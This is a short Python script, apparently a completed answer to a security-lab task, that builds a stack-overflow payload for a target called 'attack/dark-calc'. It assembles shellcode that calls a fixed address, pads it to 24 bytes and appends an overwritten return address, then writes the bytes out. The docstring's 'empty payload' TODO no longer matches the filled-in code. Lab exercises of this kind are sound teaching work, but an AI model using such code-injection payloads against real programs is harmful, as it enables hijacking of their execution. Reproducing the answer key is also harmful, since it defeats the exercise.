#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct
code = bytes.fromhex(
    'bf 04 00 00 00'
    'b8 87 1a 40 00'
    'ff d0'
)
padding = b'A' * (24 - len(code))
target = struct.pack('<Q', 0x721000800fd0)
payload = code + padding + target
sys.stdout.buffer.write(payload)
